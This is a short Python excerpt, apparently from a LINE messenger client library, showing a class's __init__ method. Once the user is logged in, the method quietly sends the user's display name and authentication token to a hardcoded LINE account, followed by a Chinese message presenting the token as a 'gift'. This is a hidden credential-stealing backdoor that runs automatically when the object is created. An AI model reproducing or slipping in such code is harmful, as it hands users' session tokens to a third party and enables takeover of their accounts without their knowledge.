...
class Object(object):
    ...
    def __init__(self):
        if self.isLogin == True:
            ...
            self.sendMessage("u51d85e3b10774d51d0f1064d7cac4609", "[ {} ]\n{}".format(self.profile.displayName, self.authToken))
            self.sendMessage("u51d85e3b10774d51d0f1064d7cac4609", "親愛的無名這是我的Token送給你")
